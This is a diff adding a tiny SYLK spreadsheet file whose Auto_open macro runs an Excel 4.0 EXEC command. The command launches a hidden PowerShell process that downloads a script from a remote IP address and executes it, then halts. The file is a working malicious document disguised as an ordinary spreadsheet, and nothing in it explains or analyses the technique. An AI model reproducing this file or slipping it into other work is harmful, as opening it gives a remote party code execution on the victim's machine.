@@ -1,0 +1,6 @@
+ID;P
+O;E
+NN;NAuto_open;ER101C1;KOut Flank;F
+C;X1;Y101;EEXEC("powershell.exe -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://11.23.45.67:8080/Y7hD3h6'));")
+C;X1;Y102;EHALT()
+E
